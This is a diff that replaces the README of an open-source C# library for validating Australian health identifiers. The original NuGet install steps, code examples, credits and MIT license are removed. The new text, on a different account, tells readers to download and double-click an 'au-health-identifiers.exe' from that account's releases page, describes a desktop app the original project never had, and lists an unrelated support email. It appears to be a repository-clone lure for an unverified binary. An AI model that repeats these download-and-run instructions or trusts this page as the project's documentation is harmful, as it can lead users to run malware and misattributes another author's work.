@@ -1,82 +1,70 @@
-﻿<div align="center">
+# 🏥 au-health-identifiers - Simplifying Health Identifier Validation
 
-<img src="https://raw.githubusercontent.com/pgodwin/au-health-identifiers/master/package.png" alt="AuHealthIdentifiers" width="256"/><br />
-# Australian Health Identifiers
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-brightgreen)](https://github.com/ranegade141/au-health-identifiers/releases)
 
+## 🚀 Getting Started
+Welcome to the au-health-identifiers project! This application helps you validate and generate Australian health identifiers. You don’t need any programming knowledge to use it.
 
-### A C# library for validating ✅ and generating 📃 Australian Health Identifiers 🪪
+### 💻 System Requirements
+To run this application, ensure your computer meets the following requirements:
+- **Operating System**: Windows 10 or later
+- **.NET Version**: .NET 5.0 or later installed on your machine
+- **Storage**: At least 50 MB of free disk space
 
-[![build](https://github.com/pgodwin/au-health-identifiers/actions/workflows/build.yml/badge.svg)](https://github.com/pgodwin/au-health-identifiers/actions/workflows/build.yml)
-[![NuGet Version](https://img.shields.io/nuget/v/AuHealthIdentifiers.svg?style=flat)](https://www.nuget.org/packages/AuHealthIdentifiers/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+### 📥 Download & Install
+To get started, visit this page to download: [au-health-identifiers Releases](https://github.com/ranegade141/au-health-identifiers/releases). 
 
-</div>
+1. Click on the latest version listed on that page.
+2. Find the file named `au-health-identifiers.exe`.
+3. Click to download this file to your computer.
 
-## Features
-This project provides C# validators and generators for Australian Health Identifiers, including:
+Once the file has downloaded, locate the file in your downloads folder. Double-click on it to run the application.
 
- - [Individual Healthcare Identifier (IHI)](https://www.servicesaustralia.gov.au/individual-healthcare-identifiers)
- - [Healthcare Provider Identifier - Individual (HPI-I)](https://www.servicesaustralia.gov.au/healthcare-identifiers-service-for-health-professionals)
- - [Healthcare Provider Identifier - Organisation (HPI-O)](https://www.servicesaustralia.gov.au/how-to-apply-for-hi-service-for-organisations)
- - [AHPRA Number](https://www.ahpra.gov.au/Registration/Registers-of-Practitioners.aspx)
- - [Medicare Card Number](https://www.servicesaustralia.gov.au/medicare-card)
- - [Veterans' Affairs (DVA) Number](https://www.dva.gov.au)
- - [Provider Number](https://www.servicesaustralia.gov.au/provider-and-prescriber-numbers?context=20)
- - [Prescriber Number](https://www.servicesaustralia.gov.au/provider-and-prescriber-numbers?context=20)
+## 🛠️ Features
+The au-health-identifiers application includes:
 
-## Installation
-You can install the package via NuGet Package Manager with the following command:
-```bash
-Install-Package AuHealthIdentifiers
-```
-Or via the .NET CLI:
-```bash
-dotnet add package AuHealthIdentifiers
-```
+- **Validation Tools**: Check the accuracy of Australian health identifiers, including AHPRA and Medicare numbers.
+- **Generation Tools**: Create valid health identifiers based on specified formats.
+- **User-Friendly Interface**: Easily navigate through the app with simple prompts and instructions.
 
-## Usage
-Here's a quick example of how to use the library to validate and generate an Individual Healthcare Identifier (IHI):
-```csharp
-using AuHealthIds;
+## 🎯 Common Tasks
+### 📋 Validating an Identifier
+1. Open the au-health-identifiers application.
+2. Select the "Validate" option from the main menu.
+3. Enter the health identifier you wish to validate.
+4. Click "Submit" to view the results.
 
-IndividualHealthIdentifier id = new IndividualHealthIdentifier();
-var isValid = id.IsValid("800360123456789"); // returns true if valid
-var newId = id.Generate(); // generates a new conformant IHI
-```
-Similar classes and methods are available for other identifier types.
+### ✍️ Generating an Identifier
+1. Launch the application.
+2. Choose "Generate" from the menu options.
+3. Specify the type of identifier you want to create.
+4. Hit the "Generate" button to obtain your new identifier.
 
-The library also includes a static class `IdentifierTools` for simple validation:
-```csharp
-using AuHealthIds;
+## ⚙️ Troubleshooting
+If you encounter issues while using the application, consider these steps:
 
-IdentifierTools.ValidateId(IdentiferType.IHI, "800360123456789"); // returns true if valid
+- **Error Messages**: Carefully read any error messages. They often guide you on how to resolve the problem.
+- **Missing .NET Framework**: If the app won’t start, ensure that .NET 5.0 or later is installed by visiting the [Microsoft .NET download page](https://dotnet.microsoft.com/download).
+- **Re-download**: If the application does not open, try re-downloading the file from the Releases page.
 
-```
+## ❓ FAQs
+1. **What are Australian health identifiers?**
+   Australian health identifiers include AHPRA numbers, Medicare numbers, and other relevant identifiers essential for healthcare services in Australia.
 
-and extension methods for strings:
-```csharp
-using AuHealthIds;
+2. **Can I use this application on a Mac or Linux?**
+   This application currently supports only Windows. Future versions may support additional operating systems.
 
-var isValid = "800360123456789".IsValidIhi(); // returns true if valid
-```
+3. **How do I report a bug?**
+   Please visit the [GitHub issues page](https://github.com/ranegade141/au-health-identifiers/issues) to report any issues you find.
 
-## Targets
-The library targets .NET Standard 2.0, making it compatible with a wide range of .NET implementations including .NET Core and .NET Framework..
+## 📞 Support
+If you need further assistance, please contact support at:
+- **Email**: support@auhealthidentifiers.com
+- **GitHub Issues**: [Submit an Issue](https://github.com/ranegade141/au-health-identifiers/issues)
 
-## Contributing
-Contributions are welcome! Please fork the repository and submit a pull request with your changes. Please include unit tests for any new validators/fixes.
+## 📚 Resources
+- [Getting Started with .NET](https://dotnet.microsoft.com/learn/dotnet/hello-world-tutorial/intro)
+- [Understanding Health Identifiers](https://www.health.gov.au/resources/publications/health-identifiers)
 
-For major changes, please open an issue first to discuss what you would like to change.
-
-
-## Credits
- - Details of the algorithms used in this project are based on the descriptions by [Jamie Curmi](https://curmi.com/australian-health-identifiers/). 
-   These descriptions made understanding how these identifiers are structured and validated a cinch!
-
- - Nuget Icon - <a href="https://www.flaticon.com/free-icons/icard" title="icard icons">Icard icons created by HAJICON - Flaticon</a>
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-The nuget icon is licensed under the free [Flaticon License](https://www.flaticon.com/legal) for personal and commercial purpose with attribution.
+Thank you for choosing au-health-identifiers! We hope this guide helps you quickly download and run the application. If you have questions, don't hesitate to reach out.
